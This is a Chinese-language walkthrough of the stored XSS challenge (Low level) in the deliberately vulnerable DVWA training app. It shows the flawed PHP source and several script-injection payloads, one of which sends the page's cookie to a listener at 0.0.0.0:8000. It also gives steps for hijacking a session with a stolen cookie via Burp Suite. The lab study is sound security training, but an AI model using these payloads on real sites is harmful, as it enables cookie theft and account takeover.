# XSS (Stored) - Low

## View Source

```PHP
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

- [`trim()`](https://www.php.net/manual/zh/function.trim.php)
    - 去除字串首尾空白等字元
- [`stripslashes()`(https://www.php.net/manual/zh/function.stripslashes.php)
    - 去除反斜線 `\`

### View Page Source

```HTML
<form method="post" name="guestform">
    <table width="550" border="0" cellpadding="2" cellspacing="1">
        <tr>
            <td width="100">Name *</td>
            <td><input name="txtName" type="text" size="30" maxlength="10"></td>
        </tr>
        <tr>
            <td width="100">Message *</td>
            <td><textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea></td>
        </tr>
        <tr>
            <td width="100">&nbsp;</td>
            <td>
                <input name="btnSign" type="submit" value="Sign Guestbook" onclick="return validateGuestbookForm(this.form);" />
                <input name="btnClear" type="submit" value="Clear Guestbook" onClick="return confirmClearGuestbook();" />
            </td>
        </tr>
    </table>

</form>
```

- 前端有限制使用者輸入

### 資料庫查詢

1. `docker exec -it dvwa /bin/bash`
2. `vim /var/www/html/dvwa/includes/dvwaPage.inc.php`
- https://github.com/digininja/DVWA/blob/master/dvwa/includes/dvwaPage.inc.php#L552-L573

```PHP
function dvwaGuestbook() {
    $query  = "SELECT name, comment FROM guestbook";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query );

    $guestbook = '';

    while( $row = mysqli_fetch_row( $result ) ) {
        if( dvwaSecurityLevelGet() == 'impossible' ) {
            $name    = htmlspecialchars( $row[0] );
            $comment = htmlspecialchars( $row[1] );
        }
        else {
            $name    = $row[0];
            $comment = $row[1];
        }

        $guestbook .= "<div id=\"guestbook_comments\">Name: {$name}<br />" . "Message: {$comment}<br /></div>\n";
    }
    return $guestbook;
}
```

### 資料庫欄位限制

1. `docker exec -it dvwa /bin/bash`
2. `mysql`
3. `DESCRIBE dvwa.guestbook;`

```
+------------+----------------------+------+-----+---------+----------------+
| Field      | Type                 | Null | Key | Default | Extra          |
+------------+----------------------+------+-----+---------+----------------+
| comment_id | smallint(5) unsigned | NO   | PRI | NULL    | auto_increment |
| comment    | varchar(300)         | YES  |     | NULL    |                |
| name       | varchar(100)         | YES  |     | NULL    |                |
+------------+----------------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
```

- 有長度限制

## Code Review

- 將使用者輸入過濾特殊字元 (防止資料庫出錯和簡單的預防 *SQLi* 措施) 後寫進資料庫中
- 當任何使用者瀏覽到當前頁面時，就查詢資料庫將名稱和訊息回傳與顯示在網頁內容中

## Answer

- 在 *Name* 或 *Message* 注入都可以
- 如果 *Payload* 超過前端限制，用 *F12 DevTools* 修改即可

### Example

```
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>window.open("http://0.0.0.0:8000/?cookie=" + document.cookie)</script>
```

- View Page Source 也看得到 (因為不像 DOM based 是動態產生)
- 到其他類別再點回 *XSS (Store)* 就會又跳出一次
```HTML
<div id="guestbook_comments">Name: test<br />Message: This is a test comment.<br /></div>
<div id="guestbook_comments">Name: CHA<br />Message: <script>alert(1)</script><br /></div>
```

- 資料庫中被寫進惡意語句
    - `SELECT name, comment FROM dvwa.guestbook;`
```
+------+--------------------------------------------------------------------------------+
| name | comment                                                                        |
+------+--------------------------------------------------------------------------------+
| test | This is a test comment.                                                        |
| CHA  | <script>alert(1)</script>                                                      |
| CHA  | <script>alert(1)</script>                                                      |
| CHA  | <script>window.open("http://0.0.0.0:8000/?cookie=" + document.cookie)</script> |
+------+--------------------------------------------------------------------------------+
4 rows in set (0.00 sec)
```

### Note

- 可以使用 *Burp Suite* 的 *Proxy* 來修改發送的 *request* 封包，將 *Cookie* 替換成透過 *XSS* 得到的受害者 *Cookie*，就能直接以受害者的身分使用網站服務，不用進行登入
- 如果是新版瀏覽器，可能會自動阻擋跳出新視窗，需要選擇 *Allow pop-ups for xxx*
- 可以點選 *Clear Guestbook* 按鈕來清空，否則每次都會跳出 `alert()` 有點煩 XD